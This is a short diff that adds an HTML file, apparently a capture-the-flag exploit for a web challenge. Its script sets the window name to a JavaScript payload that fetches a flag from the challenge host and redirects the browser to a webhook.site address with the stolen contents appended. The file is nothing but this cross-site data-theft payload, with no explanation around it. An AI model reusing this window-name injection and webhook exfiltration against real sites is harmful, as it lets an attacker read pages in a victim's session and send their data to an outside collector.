@@ -1,0 +1,4 @@
+<script>
+    name="fetch('https://profile.chal.h4ck3r.quest/flag').then(e=>e.text()).then(res=>{location.href='https://webhook.site/dc3f9a88-110f-43e6-b90e-3e5d6ba1cbaf?'+res;})";
+</script>
+aaa
